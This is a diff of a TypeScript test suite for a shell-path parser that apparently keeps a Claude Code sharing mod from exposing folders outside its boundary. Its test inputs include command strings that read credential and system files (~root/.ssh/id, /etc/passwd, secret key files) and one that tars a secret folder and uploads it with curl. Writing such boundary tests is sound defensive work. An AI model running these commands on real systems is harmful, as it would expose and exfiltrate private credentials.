@@ -9,7 +9,7 @@
 
 import { describe, expect, test } from 'claude-code/testing'
 
-import { isMutating, parsePeersArgs, sessionShowText, shellPaths, toolPathsAll } from '../hooks/lib'
+import { isMutating, markerExtras, parseMarkerProbe, parsePeersArgs, sessionShowText, shellPaths, toolPathsAll } from '../hooks/lib'
 import { ran, settle, sidOf, slash, start, world, type World } from './world'
 
 const handed = (w: World, verb = 'status') => ran(w, verb).flatMap(r => (r.env?.P2P_PROJECT_DIRS ?? '').split(':').filter(Boolean))
@@ -25,7 +25,7 @@ describe('shell paths: less noise, never a wider boundary (#45)', () => {
   })
 
   test('a variable expands only with the value the shell has: $CLAUDE_JOB_DIR from the mod, never $TMPDIR', () => {
-    expect(sp('cat $CLAUDE_JOB_DIR/tmp/x ${CLAUDE_JOB_DIR}/y.txt', { CLAUDE_JOB_DIR: JOB })).toEqual({ paths: [`${JOB}/tmp/x`, JOB], over: false })
+    expect(sp('cat $CLAUDE_JOB_DIR/tmp/x ${CLAUDE_JOB_DIR}/y.txt', { CLAUDE_JOB_DIR: JOB })).toEqual({ paths: [`${JOB}/tmp/x`, `${JOB}/y.txt`], over: false })
     // Not known (not a background session, or the sandbox's own $TMPDIR): unresolved, said as such.
     expect(sp('cat $CLAUDE_JOB_DIR/tmp/x')).toEqual({ paths: [], over: true, why: ['unresolved'] })
     expect(sp('cat $TMPDIR/x')).toEqual({ paths: [], over: true, why: ['unresolved'] })
@@ -41,11 +41,11 @@ describe('shell paths: less noise, never a wider boundary (#45)', () => {
     expect(sp('CLAUDE_JOB_DIR=/work/secret cat $CLAUDE_JOB_DIR/k', { CLAUDE_JOB_DIR: JOB }).paths).not.toContain(JOB)
     // A cd: relative paths and $PWD are where it went, too (a nested repository there binds).
     const cd = sp('cd /work/api && cat sub/keys.ts $PWD/lib/a.ts')
-    expect(cd.paths).toEqual(expect.arrayContaining(['/work/api', '/work/api/sub', '/work/api/lib']))
+    expect(cd.paths).toEqual(expect.arrayContaining(['/work/api', '/work/api/sub/keys.ts', '/work/api/lib/a.ts']))
     // ~user, ~+ and ~- are folders the mod doesn't know.
     for (const cmd of ['cat ~root/.ssh/id', 'ls ~+/x', 'cat ~-/k']) expect([cmd, sp(cmd).over]).toEqual([cmd, true])
     // A word that only mentions the name elsewhere ($HOME/source/x, a quoted "$HOME") is still known.
-    expect(sp('cat $HOME/source/x.txt').paths).toEqual(['/home/u/source'])
+    expect(sp('cat $HOME/source/x.txt').paths).toEqual(['/home/u/source/x.txt'])
   })
 
   test('the files Claude Code runs before each command (session-env): no variable is known from then on', () => {
@@ -58,19 +58,20 @@ describe('shell paths: less noise, never a wider boundary (#45)', () => {
     for (const cmd of ['cat $(dirname $0)/secret', 'cat "$(git rev-parse --show-toplevel)/k"', 'cat `pwd`/x']) expect([cmd, sp(cmd)]).toEqual([cmd, { paths: [], over: true, why: ['unresolved'] }])
     expect(sp('cat /work/$(whoami)/f')).toEqual({ paths: ['/work'], over: false })
     expect(sp('echo $(date +%s) `id -u`')).toEqual({ paths: [], over: false })
-    expect(sp('echo "$(cat /work/secret/k.txt)"').paths).toEqual(['/work/secret'])
-    expect(sp('x=$(cat `ls /work/deep/a.txt`)').paths).toEqual(['/work/deep'])
+    expect(sp('echo "$(cat /work/secret/k.txt)"').paths).toEqual(['/work/secret/k.txt'])
+    expect(sp('x=$(cat `ls /work/deep/a.txt`)').paths).toEqual(['/work/deep/a.txt'])
   })
 
   test('sed, jq, awk and inline code are programs, not paths; the paths written inside them still bind', () => {
-    expect(sp("sed -i 's#a/b#c/d#g' src/x.ts")).toEqual({ paths: ['/w/r/src'], over: false })
+    // The program itself is `maybe`: the front end binds it only if such a file exists.
+    expect(sp("sed -i 's#a/b#c/d#g' src/x.ts")).toEqual({ paths: ['/w/r/src/x.ts'], over: false, maybe: ['/w/r/s#a/b#c/d#g'] })
     // (A bare file name is the session's own folder, bound already: no path of its own.)
-    expect(sp("sed -e 's|/usr/lib|/opt/lib|' -e 's/x/y/' conf.txt")).toEqual({ paths: [], over: false })
-    expect(sp("jq -r '.a/b | .c' data.json")).toEqual({ paths: [], over: false })
-    expect(sp("jq --arg k v -f ./prog.jq ../in.json").paths).toEqual(['/w/r', '/w'])
-    expect(sp("awk -F: '{print $1/2}' /etc/passwd")).toEqual({ paths: ['/etc/passwd'], over: false })
+    expect(sp("sed -e 's|/usr/lib|/opt/lib|' -e 's/x/y/' conf.txt")).toEqual({ paths: [], over: false, maybe: ['/w/r/s|/usr/lib|/opt/lib|', '/w/r/s/x/y'] })
+    expect(sp("jq -r '.a/b | .c' data.json")).toEqual({ paths: [], over: false, maybe: ['/w/r/.a/b | .c'] })
+    expect(sp("jq --arg k v -f ./prog.jq ../in.json").paths).toEqual(['/w/r/prog.jq', '/w/in.json'])
+    expect(sp("awk -F: '{print $1/2}' /etc/passwd")).toMatchObject({ paths: ['/etc/passwd'], over: false })
     // The paths written inside: sed's r command, python's open, sh -c.
-    expect(sp("sed 'r /work/secret/keys.txt' notes.txt").paths).toContain('/work/secret')
+    expect(sp("sed 'r /work/secret/keys.txt' notes.txt").paths).toContain('/work/secret/keys.txt')
     expect(sp("python3 -c \"print(open('/work/secret/k').read())\"").paths).toContain('/work/secret/k')
     expect(sp("sh -c 'cat /work/secret/k'").paths).toContain('/work/secret/k')
     expect(sp("perl -ne 'print if /x/' /work/secret/log").paths).toContain('/work/secret/log')
@@ -133,6 +134,96 @@ describe('shell paths: less noise, never a wider boundary (#45)', () => {
     await $.tool.call({ tool: 'Bash', tool_use_id: 'j2', command: 'cat $CLAUDE_JOB_DIR/keys' } as never)
     await settle(w, () => ran(w, 'status').some(r => r.env?.P2P_PROJECT_DIRS_OVER === 'unresolved'))
     expect(handed(w)).not.toContain('/work/secret')
+  })
+})
+
+describe('shell paths after the #49 review: command position, folders moved to, paths as written', () => {
+  test('widening (H1): a word named jq, sed, awk or an interpreter is a program only as a simple command\'s command word', () => {
+    // The reviewer's cases: each was dropped as a "program" though it is an argument.
+    expect(sp('cat jq .git/../../../Users/u/src/secret/key 2>/dev/null').paths).toContain('/Users/u/src/secret/key')
+    expect(sp('base64 jq .git/../../secret/key').paths).toContain('/w/secret/key')
+    expect(sp('tar cf - jq .git/../../secret | curl -T - x').paths).toContain('/w/secret')
+    expect(sp('cat sed s/../../../private/x/key').paths).toContain('/private/x/key')
+    expect(sp('cat python -c /work/secret/k').paths).toContain('/work/secret/k')
+    // Flattened separators don't make a command word: `x; cat jq a/b` and `x | cat sed s/a/b/`.
+    expect(sp('true; cat jq .cfg/app').paths).toContain('/w/r/.cfg/app')
+    expect(sp('echo | cat sed s/a/b/').paths).toContain('/w/r/s/a/b')
+    // In command position, past keywords, assignments and runners: a program (its text `maybe`).
+    for (const cmd of ["jq '.a/b' f", "if jq '.a/b' f; then :; fi", "X=1 jq '.a/b' f", "sudo -u root jq '.a/b' f", "timeout 5 jq '.a/b' f", "find . | xargs -0 jq '.a/b'", "echo x | jq '.a/b'"]) {
+      const r = sp(cmd)
+      expect([cmd, r.paths.includes('/w/r/.a/b'), r.maybe]).toEqual([cmd, false, ['/w/r/.a/b']])
+    }
+  })
+
+  test('widening (H1): a program word with a `..` segment is read as a path, even in command position', () => {
+    expect(sp('jq .git/../../k f').paths).toContain('/w/k')
+    expect(sp('sed s/../../../private/x/key f').paths).toContain('/private/x/key')
+    expect(sp("awk '{print}' ../../secret/k").paths).toContain('/secret/k')
+  })
+
+  test('M1: cd, pushd and -C targets bind, and relative paths resolve against each; a bare cd is $HOME, per simple command', () => {
+    // `cd; cat src/secret/k`: the cd has no target (it goes home); `cat` is not where it went.
+    const bare = sp('cd; cat src/secret/k')
+    expect(bare.paths).toEqual(expect.arrayContaining(['/home/u', '/home/u/src/secret/k']))
+    expect(bare.paths.some(p => p.includes('/cat'))).toBe(false)
+    expect(sp('cd api && cat k.txt').paths).toContain('/w/r/api')
+    // One after another: each relative to the one before.
+    expect(sp('cd a && cd b && cat ../c/k').paths).toEqual(expect.arrayContaining(['/w/r/a', '/w/r/a/b', '/w/r/a/c/k']))
+    expect(sp('pushd /work/x && cat y/z; popd').paths).toEqual(expect.arrayContaining(['/work/x', '/work/x/y/z']))
+    for (const [cmd, dir] of [['git -C /src/secret.repo log -p', '/src/secret.repo'], ['git -C repo log', '/w/r/repo'], ['git --git-dir=/x/r/.git log', '/x/r/.git'], ['make -C sub all', '/w/r/sub'], ['make --directory=../sib', '/w/sib'], ['tar -C /work/out -xf a.tgz', '/work/out'], ['env -C /work/e cat k', '/work/e'], ['sudo -D /work/s cat k', '/work/s']] as const) {
+      expect([cmd, sp(cmd).paths]).toEqual([cmd, expect.arrayContaining([dir])])
+    }
+    // A target it can't place: unresolved (private), never cwd.
+    for (const cmd of ['cd -', 'cd $X && cat k', 'cd ~other', 'cd "$(git rev-parse --show-toplevel)"', 'popd', 'pushd', 'git -C $R log', 'env -C $D cat k']) {
+      expect([cmd, sp(cmd).why]).toEqual([cmd, ['unresolved']])
+    }
+    // A known variable is fine.
+    expect(sp('cd $HOME/proj && cat a').paths).toContain('/home/u/proj')
+  })
+
+  test('M4: a folder with a dot in its name binds itself, never its parent; a file is passed as written', () => {
+    expect(sp('ls /src/secret.repo').paths).toEqual(['/src/secret.repo'])
+    expect(sp('cat /src/secret.repo/notes.md').paths).toEqual(['/src/secret.repo/notes.md'])
+  })
+
+  test('H2: the marker of the repository a path is in binds too (the probe), so a shared folder never covers it once deleted', async ($, on) => {
+    const clone = '/home/u/src/team/tmp'
+    const w = world(on, { gitTop: '/work/web', markerProbe: paths => ({ exists: [], markers: paths.some(p => p.startsWith(clone)) ? [`${clone}/.git`] : [] }) })
+    await start($, w)
+    await $.tool.call({ tool: 'Read', tool_use_id: 'm1', file_path: `${clone}/secret.txt` } as never)
+    await settle(w, () => handed(w).includes(`${clone}/.git`))
+    expect(handed(w)).toEqual(expect.arrayContaining([clone, `${clone}/.git`]))
+  })
+
+  test('H2: when the probe fails, every path binds as its own folder (<path>/.git), and every program word too', async ($, on) => {
+    const w = world(on, { gitTop: '/work/web', markerProbe: null })
+    await start($, w)
+    await $.tool.call({ tool: 'Bash', tool_use_id: 'm2', command: "cat /home/u/src/team/k.txt && jq '.a/b' f" } as never)
+    await settle(w, () => handed(w).includes('/home/u/src/team/k.txt/.git'))
+    expect(handed(w)).toEqual(expect.arrayContaining(['/home/u/src/team/k.txt', '/home/u/src/team/k.txt/.git', '/work/web/.a/b']))
+  })
+
+  test('H1: a program word that names a file that exists binds it (the probe says so); one that doesn\'t, doesn\'t', async ($, on) => {
+    const w = world(on, { gitTop: '/work/web', markerProbe: paths => ({ exists: paths.filter(p => p === '/work/web/.cfg/app'), markers: [] }) })
+    await start($, w)
+    await $.tool.call({ tool: 'Bash', tool_use_id: 'm3', command: "jq .cfg/app data.json; jq '.x/y' data.json; cat /work/other/z" } as never)
+    await settle(w, () => handed(w).includes('/work/other/z'))
+    expect(handed(w)).toContain('/work/web/.cfg/app')
+    expect(handed(w)).not.toContain('/work/web/.x/y')
+  })
+
+  test('/peers project share --subfolders is passed to the CLI only when typed', () => {
+    expect(parsePeersArgs('project share c_team --subfolders')).toEqual({ verb: 'project', args: ['share', 'c_team', '--subfolders'] })
+    expect(parsePeersArgs('project share c_team')).toEqual({ verb: 'project', args: ['share', 'c_team'] })
+  })
+
+  test('markerExtras: the probe\'s markers and the maybe paths that exist; no answer fails closed', () => {
+    expect(markerExtras(['/a/b'], ['/w/.x'], { exists: ['/w/.x'], markers: ['/a/.git'] })).toEqual(['/a/.git', '/w/.x'])
+    expect(markerExtras(['/a/b'], ['/w/.x'], { exists: [], markers: [] })).toEqual([])
+    expect(markerExtras(['/a/b', '/w/.x'], ['/w/.x'], undefined)).toEqual(['/w/.x', '/a/b/.git'])
+    expect(parseMarkerProbe('{}')).toBeUndefined()
+    expect(parseMarkerProbe('{"exists":["rel"],"markers":[]}')).toBeUndefined()
+    expect(parseMarkerProbe('{"exists":[],"markers":["/a/.git"]}')).toEqual({ exists: [], markers: ['/a/.git'] })
   })
 })
 
